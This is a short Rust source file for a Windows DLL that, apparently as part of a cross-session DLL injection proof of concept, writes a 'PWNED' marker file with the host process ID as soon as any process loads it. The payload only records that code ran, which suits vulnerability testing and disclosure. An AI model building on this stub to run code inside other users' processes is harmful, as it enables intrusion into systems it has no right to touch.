// Minimal injection-proof DLL: on load, writes a marker file proving code
// ran inside whatever process loaded it. No exports needed - DllMain does
// the work on DLL_PROCESS_ATTACH.
#![allow(non_snake_case)]
use std::ffi::c_void;
use std::fs;

const DLL_PROCESS_ATTACH: u32 = 1;

#[no_mangle]
#[allow(non_snake_case)]
pub extern "system" fn DllMain(_hinst: *mut c_void, reason: u32, _reserved: *mut c_void) -> i32 {
    if reason == DLL_PROCESS_ATTACH {
        let pid = std::process::id();
        let msg = format!(
            "CROSS-SESSION-INJECTION-CONFIRMED\npid-of-injected-process={}\n",
            pid
        );
        let _ = fs::write("C:\\srt-poc\\PWNED_cross_session_injection.txt", msg);
    }
    1
}
